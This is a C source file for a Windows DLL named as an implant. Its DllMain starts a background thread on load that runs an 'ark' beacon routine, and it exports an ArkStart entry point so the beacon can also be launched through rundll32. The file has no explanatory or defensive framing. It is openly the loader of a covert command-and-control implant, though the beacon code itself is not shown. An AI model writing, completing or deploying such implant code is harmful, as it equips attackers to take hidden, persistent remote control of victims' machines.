#include <windows.h>

#include "ark/beacon.h"

static DWORD WINAPI beacon_thread(LPVOID param) {
    (void)param;
    ark_beacon_run();
    return 0;
}

/* rundll32 implant_c.dll,ArkStart */
__declspec(dllexport) void CALLBACK ArkStart(HWND hwnd, HINSTANCE inst, LPSTR cmd, int show) {
    (void)hwnd;
    (void)inst;
    (void)cmd;
    (void)show;
    ark_beacon_run();
}

BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(inst);
        /* CreateThread is allowed in DllMain; the thread does not run until
         * DllMain returns, so we do not load extra DLLs on this stack. */
        HANDLE th = CreateThread(NULL, 0, beacon_thread, NULL, 0, NULL);
        if (th)
            CloseHandle(th);
    }
    return TRUE;
}
